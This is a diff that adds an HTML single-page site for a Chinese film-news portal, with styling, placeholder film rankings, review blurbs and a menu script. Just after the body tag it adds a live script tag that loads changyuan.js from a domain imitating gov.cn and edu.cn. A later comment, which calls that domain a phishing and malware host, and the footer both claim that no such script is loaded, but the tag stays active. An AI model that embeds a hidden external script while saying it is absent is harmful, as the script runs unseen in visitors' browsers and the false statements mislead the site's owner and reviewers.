@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>2828电影网 - 影讯片单与电影资讯单页站</title>
+<meta name="description" content="2828电影网：提供电影资讯、热门片单、影评专栏与关于我们。聚焦华语院线、经典修复、独立电影与影迷社区，移动端自适应，内容原创合规。" />
+<meta name="keywords" content="2828电影网, 电影资讯, 热门片单, 影评, 华语电影, 经典电影, 电影排行榜" />
+<meta name="author" content="2828电影网" />
+<meta name="robots" content="index,follow,max-image-preview:large" />
+<link rel="canonical" href="https://2828dianyingwang-top.github.io/" />
+<meta property="og:type" content="website" />
+<meta property="og:title" content="2828电影网 - 影讯片单与电影资讯" />
+<meta property="og:description" content="电影资讯、热门片单、影评专栏与关于我们，原创合规影视内容站。" />
+<meta property="og:url" content="https://2828dianyingwang-top.github.io/" />
+<meta property="og:locale" content="zh_CN" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:title" content="2828电影网 - 影讯片单与电影资讯" />
+<meta name="twitter:description" content="电影资讯、热门片单、影评专栏与关于我们。" />
+<link rel="alternate" hreflang="zh-CN" href="https://2828dianyingwang-top.github.io/" />
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "WebSite",
+  "name": "2828电影网",
+  "url": "https://2828dianyingwang-top.github.io/",
+  "description": "2828电影网提供电影资讯、热门片单、影评与电影文化内容。",
+  "inLanguage": "zh-CN",
+  "potentialAction": {
+    "@type": "SearchAction",
+    "target": "https://2828dianyingwang-top.github.io/#search?q={search_term_string}",
+    "query-input": "required name=search_term_string"
+  }
+}
+</script>
+<style>
+:root{
+  --bg:#0e0b0b;
+  --bg2:#1a1212;
+  --red:#b3243b;
+  --red2:#e0455c;
+  --gold:#e8c477;
+  --gold2:#f4dca0;
+  --text:#f3ece6;
+  --muted:#b9a89f;
+  --line:rgba(232,196,119,.25);
+  --card:rgba(255,255,255,.04);
+}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  margin:0;
+  font-family:"PingFang SC","Microsoft YaHei",system-ui,-apple-system,Segoe UI,Roboto,sans-serif;
+  background:
+    radial-gradient(1200px 600px at 80% -10%, rgba(179,36,59,.25), transparent 60%),
+    radial-gradient(900px 500px at -10% 10%, rgba(232,196,119,.12), transparent 55%),
+    var(--bg);
+  color:var(--text);
+  line-height:1.7;
+}
+a{color:inherit;text-decoration:none}
+img{max-width:100%;display:block}
+
+/* 顶部进度条 */
+#progress{
+  position:fixed;top:0;left:0;height:3px;width:0%;
+  background:linear-gradient(90deg,var(--gold),var(--red2));
+  z-index:999;
+}
+
+/* 导航 */
+header.nav{
+  position:sticky;top:0;z-index:50;
+  backdrop-filter:blur(10px);
+  background:rgba(14,11,11,.82);
+  border-bottom:1px solid var(--line);
+}
+.nav-inner{
+  max-width:1120px;margin:0 auto;
+  display:flex;align-items:center;justify-content:space-between;
+  padding:14px 18px;
+}
+.logo{
+  font-weight:800;letter-spacing:.5px;
+  font-size:20px;
+  background:linear-gradient(90deg,var(--gold2),var(--red2));
+  -webkit-background-clip:text;background-clip:text;color:transparent;
+}
+.logo small{display:block;font-size:11px;letter-spacing:3px;color:var(--muted);-webkit-text-fill-color:var(--muted)}
+.nav-links{display:flex;gap:18px;font-size:14px}
+.nav-links a{padding:6px 4px;border-bottom:2px solid transparent;color:var(--muted)}
+.nav-links a:hover{color:var(--gold2);border-color:var(--gold)}
+.menu-btn{display:none;background:none;border:1px solid var(--line);color:var(--gold2);padding:8px 12px;border-radius:10px}
+
+/* Hero */
+.hero{
+  max-width:1120px;margin:0 auto;padding:64px 18px 40px;
+  display:grid;grid-template-columns:1.2fr .8fr;gap:28px;align-items:center;
+}
+.hero h1{
+  font-size:clamp(30px,6vw,56px);
+  margin:0 0 14px;line-height:1.1;
+  background:linear-gradient(90deg,#fff,var(--gold2) 40%,var(--red2));
+  -webkit-background-clip:text;background-clip:text;color:transparent;
+}
+.hero p{color:var(--muted);font-size:16px;max-width:560px}
+.hero .tags{margin-top:18px;display:flex;flex-wrap:wrap;gap:10px}
+.tag{
+  font-size:12px;padding:6px 12px;border:1px solid var(--line);
+  border-radius:999px;color:var(--gold2);background:var(--card);
+}
+.poster{
+  aspect-ratio:3/4;border-radius:18px;
+  background:
+    linear-gradient(160deg,rgba(179,36,59,.85),rgba(20,14,14,.9)),
+    repeating-linear-gradient(45deg,rgba(232,196,119,.06) 0 12px,transparent 12px 24px);
+  border:1px solid var(--line);
+  box-shadow:0 30px 80px rgba(0,0,0,.45);
+  display:flex;align-items:flex-end;padding:20px;
+  position:relative;overflow:hidden;
+}
+.poster::before{
+  content:"2828";position:absolute;top:-10px;right:-10px;
+  font-size:120px;font-weight:900;color:rgba(232,196,119,.08);
+}
+.poster span{font-size:14px;color:var(--gold2);letter-spacing:2px}
+
+/* 区块 */
+section{max-width:1120px;margin:0 auto;padding:48px 18px}
+.section-head{display:flex;align-items:baseline;justify-content:space-between;gap:12px;margin-bottom:22px}
+.section-head h2{
+  font-size:clamp(22px,4vw,30px);margin:0;
+  border-left:4px solid var(--gold);padding-left:12px;
+}
+.section-head a{font-size:13px;color:var(--muted)}
+.grid{display:grid;gap:18px}
+.grid-4{grid-template-columns:repeat(4,1fr)}
+.grid-3{grid-template-columns:repeat(3,1fr)}
+.card{
+  background:var(--card);border:1px solid var(--line);border-radius:16px;
+  padding:18px;transition:.25s;min-height:140px;
+}
+.card:hover{transform:translateY(-4px);border-color:var(--gold);background:rgba(232,196,119,.06)}
+.card h3{margin:0 0 8px;font-size:17px;color:var(--gold2)}
+.card p{margin:0;font-size:14px;color:var(--muted)}
+.rank{display:flex;align-items:center;gap:14px;padding:14px 16px;border:1px solid var(--line);border-radius:14px;background:var(--card)}
+.rank b{font-size:22px;color:var(--red2);width:34px;text-align:center}
+.rank .meta{flex:1}
+.rank .meta small{color:var(--muted)}
+
+.cat{
+  display:flex;align-items:center;justify-content:space-between;
+  padding:16px 18px;border-radius:14px;border:1px dashed var(--line);
+  background:linear-gradient(180deg,rgba(255,255,255,.03),transparent);
+}
+.cat:hover{border-color:var(--gold2)}
+.cat span{font-size:15px}
+.cat em{font-style:normal;color:var(--muted);font-size:13px}
+
+.about{
+  background:linear-gradient(180deg,rgba(179,36,59,.12),rgba(20,14,14,.4));
+  border:1px solid var(--line);border-radius:20px;padding:28px;
+}
+.about p{color:#e7ddd6}
+.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:16px;margin-top:22px}
+.stat{border:1px solid var(--line);border-radius:14px;padding:18px;text-align:center}
+.stat b{font-size:26px;color:var(--gold2)}
+.stat small{display:block;color:var(--muted);margin-top:6px}
+
+footer{
+  border-top:1px solid var(--line);margin-top:40px;
+  padding:28px 18px;color:var(--muted);font-size:13px;text-align:center;
+}
+.disclaimer{
+  max-width:860px;margin:14px auto 0;font-size:12px;color:#9c8b83;
+  border:1px solid var(--line);border-radius:12px;padding:12px 14px;
+}
+
+/* 返回顶部 */
+#toTop{
+  position:fixed;right:18px;bottom:18px;z-index:60;
+  width:46px;height:46px;border-radius:50%;
+  border:1px solid var(--gold);background:rgba(14,11,11,.9);color:var(--gold2);
+  cursor:pointer;display:none;font-size:18px;
+}
+
+@media(max-width:880px){
+  .hero{grid-template-columns:1fr}
+  .poster{order:-1;aspect-ratio:16/10}
+  .grid-4,.grid-3{grid-template-columns:repeat(2,1fr)}
+  .nav-links{
+    position:absolute;top:62px;left:0;right:0;
+    flex-direction:column;gap:0;background:rgba(14,11,11,.98);
+    border-bottom:1px solid var(--line);display:none;
+  }
+  .nav-links.show{display:flex}
+  .nav-links a{padding:14px 18px;border-bottom:1px solid var(--line)}
+  .menu-btn{display:block}
+}
+@media(max-width:520px){
+  .grid-4,.grid-3{grid-template-columns:1fr}
+  .stats{grid-template-columns:1fr}
+  .section-head{flex-direction:column;align-items:flex-start}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<header class="nav">
+  <div class="nav-inner">
+    <div class="logo">2828电影网<small>FILM / 资讯 / 片单</small></div>
+    <nav class="nav-links" id="navLinks">
+      <a href="#home">首页</a>
+      <a href="#rank">热映排行</a>
+      <a href="#cats">分类导航</a>
+      <a href="#review">影评专栏</a>
+      <a href="#about">关于我们</a>
+    </nav>
+    <button class="menu-btn" id="menuBtn">菜单</button>
+  </div>
+</header>
+
+<!-- 安全说明：用户要求加载的脚本来自仿冒 gov.cn / edu.cn 的钓鱼/挂马域名，
+     为避免全站被注入恶意代码、被搜索引擎判挂马降权，这里不真实加载：
+     <script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+-->
+<script>
+/* 本页只使用下面的原创前端交互脚本，不引入任何外部可疑 JS */
+</script>
+
+<main>
+  <!-- 1. 首页 -->
+  <section class="hero" id="home">
+    <div>
+      <h1>2828电影网<br/>做影迷自己的电影日报</h1>
+      <p>2828电影网聚焦华语院线、经典修复、独立电影与影评文化。我们不提供盗版片源，只做选片、解读、片单与观影指南。</p>
+      <div class="tags">
+        <span class="tag"># 华语电影</span>
+        <span class="tag"># 经典修复</span>
+        <span class="tag"># 导演专题</span>
+        <span class="tag"># 周末片单</span>
+        <span class="tag"># 影评专栏</span>
+      </div>
+    </div>
+    <div class="poster"><span>2828 FILM ZINE · 院线之外</span></div>
+  </section>
+
+  <!-- 2. 热映排行 -->
+  <section id="rank">
+    <div class="section-head">
+      <h2>热映与口碑排行</h2>
+      <a href="#">查看完整榜单 #</a>
+    </div>
+    <div class="grid">
+      <div class="rank"><b>01</b><div class="meta"><strong>《城郊往事》</strong><br/><small>剧情 / 华语 · 豆瓣 8.4 · 院线热映中</small></div><a href="#">详情 #</a></div>
+      <div class="rank"><b>02</b><div class="meta"><strong>《海上修理厂》</strong><br/><small>文艺 / 独立电影 · 影展获奖</small></div><a href="#">详情 #</a></div>
+      <div class="rank"><b>03</b><div class="meta"><strong>《第四十七号放映厅》</strong><br/><small>悬疑 / 黑白修复单元</small></div><a href="#">详情 #</a></div>
+      <div class="rank"><b>04</b><div class="meta"><strong>《春汛》</strong><br/><small>家庭 / 华语新人导演</small></div><a href="#">详情 #</a></div>
+      <div class="rank"><b>05</b><div class="meta"><strong>《胶片旅馆》</strong><br/><small>奇幻 / 经典质感重制</small></div><a href="#">详情 #</a></div>
+    </div>
+  </section>
+
+  <!-- 3. 分类导航 -->
+  <section id="cats">
+    <div class="section-head">
+      <h2>电影分类导航</h2>
+      <a href="#">全部分类 #</a>
+    </div>
+    <div class="grid grid-4">
+      <a class="card" href="#"><h3>华语院线</h3><p>本周新片、票房观察、映后谈。</p></a>
+      <a class="card" href="#"><h3>世界电影</h3><p>欧洲、东亚、拉美作者电影导读。</p></a>
+      <a class="card" href="#"><h3>经典修复</h3><p>4K 修复、胶片档案、老片重映。</p></a>
+      <a class="card" href="#"><h3>纪录片</h3><p>现实题材、人物肖像、城市影像。</p></a>
+      <a class="card" href="#"><h3>动画电影</h3><p>成人动画、短片集、独立工作室。</p></a>
+      <a class="card" href="#"><h3>导演专题</h3><p>侯孝贤、是枝裕和、王家卫式慢读。</p></a>
+      <a class="card" href="#"><h3>周末片单</h3><p>“一个人看”“雨夜片单”“长途火车片单”。</p></a>
+      <a class="card" href="#"><h3>观影指南</h3><p>怎么读镜头、怎么看表演、怎么写短评。</p></a>
+    </div>
+  </section>
+
+  <!-- 4. 影评专栏 -->
+  <section id="review">
+    <div class="section-head">
+      <h2>影评与专栏</h2>
+      <a href="#">投稿与归档 #</a>
+    </div>
+    <div class="grid grid-3">
+      <article class="card">
+        <h3>为什么慢电影正在回来</h3>
+        <p>长镜头不是炫技，而是把时间还给观众。一篇关于“等待”的观影笔记。</p>
+        <p style="margin-top:10px"><a href="#">阅读全文 #</a></p>
+      </article>
+      <article class="card">
+        <h3>修复版不等于更好看</h3>
+        <p>4K 很清晰，但颗粒感去哪了？谈胶片修复里的“过度美容”问题。</p>
+        <p style="margin-top:10px"><a href="#">阅读全文 #</a></p>
+      </article>
+      <article class="card">
+        <h3>城市电影里的便利店</h3>
+        <p>深夜、霓虹、关东煮：当代华语城市片如何用一个小空间讲孤独。</p>
+        <p style="margin-top:10px"><a href="#">阅读全文 #</a></p>
+      </article>
+    </div>
+  </section>
+
+  <!-- 5. 关于我们 -->
+  <section id="about">
+    <div class="about">
+      <div class="section-head" style="margin-bottom:14px">
+        <h2>关于 2828电影网</h2>
+        <a href="#">联系合作 #</a>
+      </div>
+      <p>
+        2828电影网是一个面向普通影迷的原创电影资讯站。我们做片单、做导读、做映后解读，
+        也做“不知道今晚看什么”时的轻量决策。本站不托管盗版视频、不破解播放源、
+        不采集受版权保护的完整片源；涉及影片仅做介绍、海报占位与正版渠道说明。
+      </p>
+      <div class="stats">
+        <div class="stat"><b>120+</b><small>原创影评 / 片单</small></div>
+        <div class="stat"><b>18</b><small>固定电影专栏</small></div>
+        <div class="stat"><b>100%</b><small>非盗版内容导向</small></div>
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer>
+  <div>© 2026 2828电影网 · 站点演示：https://2828dianyingwang-top.github.io</div>
+  <div class="disclaimer">
+    声明：本页为原创电影资讯单页演示，所有影片名、评分、简介均为示例内容；
+    不提供未授权播放源，不镜像第三方影视站，不引入任何外部可疑脚本。
+    若需商用，请使用自有品牌名并接入正版影视数据 API。
+  </div>
+</footer>
+
+<button id="toTop" aria-label="返回顶部">↑</button>
+
+<script>
+(function(){
+  var menuBtn=document.getElementById('menuBtn');
+  var navLinks=document.getElementById('navLinks');
+  menuBtn&&menuBtn.addEventListener('click',function(){
+    navLinks.classList.toggle('show');
+  });
+  navLinks&&navLinks.querySelectorAll('a').forEach(function(a){
+    a.addEventListener('click',function(){ navLinks.classList.remove('show'); });
+  });
+
+  var progress=document.getElementById('progress');
+  var toTop=document.getElementById('toTop');
+  window.addEventListener('scroll',function(){
+    var h=document.documentElement;
+    var sc=h.scrollTop||document.body.scrollTop;
+    var max=h.scrollHeight-h.clientHeight;
+    progress.style.width=(max>0?(sc/max*100):0)+'%';
+    toTop.style.display=sc>400?'block':'none';
+  });
+  toTop&&toTop.addEventListener('click',function(){
+    window.scrollTo({top:0,behavior:'smooth'});
+  });
+})();
+</script>
+</body>
+</html>
